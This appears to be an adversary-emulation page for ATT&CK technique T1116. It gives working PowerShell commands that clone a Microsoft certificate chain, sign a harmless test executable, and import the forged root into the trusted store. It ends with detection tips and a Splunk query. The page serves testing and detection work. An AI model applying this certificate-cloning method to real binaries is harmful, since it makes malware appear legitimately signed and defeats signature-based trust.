# T1116 - Code Signing
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1116)
<blockquote>
Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. [1](https://en.wikipedia.org/wiki/Code_signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries [2](http://www.thesafemac.com/new-signed-malware-called-janicab/). 
The certificates used during an operation may be created, forged, or stolen by the adversary.[3](https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/),[4](https://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates)

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. [1](https://en.wikipedia.org/wiki/Code_signing)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.
</blockquote>

## Assumptions
The attacker is trying to avoid detection by having their software signed with legitimate certificates by cloning, forging and having valid certificates.

## Execution:
<blockquote>
# We'll just store the cloned certificates in current user "Personal" store for now.
$CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }

$MS_Root_Cert = Get-PfxCertificate -FilePath C:\Test\MSKernel32Root.cer
$Cloned_MS_Root_Cert = New-SelfSignedCertificate -CloneCert $MS_Root_Cert @CertStoreLocation

$MS_PCA_Cert = Get-PfxCertificate -FilePath C:\Test\MSKernel32PCA.cer
$Cloned_MS_PCA_Cert = New-SelfSignedCertificate -CloneCert $MS_PCA_Cert -Signer $Cloned_MS_Root_Cert @CertStoreLocation

$MS_Leaf_Cert = Get-PfxCertificate -FilePath C:\Test\MSKernel32Leaf.cer
$Cloned_MS_Leaf_Cert = New-SelfSignedCertificate -CloneCert $MS_Leaf_Cert -Signer $Cloned_MS_PCA_Cert @CertStoreLocation

/# Create some sample code to practice signing on
Add-Type -TypeDefinition @'
public class Foo {
    public static void Main(string[] args) {
        System.Console.WriteLine("Hello, World!");
        System.Console.ReadKey();
    }
}
'@ -OutputAssembly C:\Test\HelloWorld.exe

/# Validate that that HelloWorld.exe is not signed.
Get-AuthenticodeSignature -FilePath C:\Test\HelloWorld.exe

/# Sign HelloWorld.exe with the cloned Microsoft leaf certificate.
Set-AuthenticodeSignature -Certificate $Cloned_MS_Leaf_Cert -FilePath C:\Test\HelloWorld.exe
/# The certificate will not properly validate because the root certificate is not trusted.

/# View the StatusMessage property to see the reason why Set-AuthenticodeSignature returned "UnknownError"
/# "A certificate chain processed, but terminated in a root certificate which is not trusted by the trust provider"
Get-AuthenticodeSignature -FilePath C:\Test\HelloWorld.exe | Format-List *

/# Save the root certificate to disk and import it into the current user root store.
/# Upon doing this, the HelloWorld.exe signature will validate properly.
Export-Certificate -Type CERT -FilePath C:\Test\MSKernel32Root_Cloned.cer -Cert $Cloned_MS_Root_Cert
Import-Certificate -FilePath C:\Test\MSKernel32Root_Cloned.cer -CertStoreLocation Cert:\CurrentUser\Root\

/# You may need to start a new PowerShell process for the valid signature to take effect.
Get-AuthenticodeSignature -FilePath C:\Test\HelloWorld.exe

## Detection:
* Create baseline of certificates on your network
* Investigate any potentially unusual certificates
* Look for selfsigned cloned legitimate certificates
* [Read Mitre ATT&CK for more Detection info](https://attack.mitre.org/wiki/Technique/T1116)

### Visibility
* Search for evidence of the invalid or forged certificates using AutoRuns

### Filter / Correlation in Splunk
```
commandline:"New-SelfSignedCertificate*" AND (commandline:"*CloneCert*" OR commandline:"*-Signer*")
```
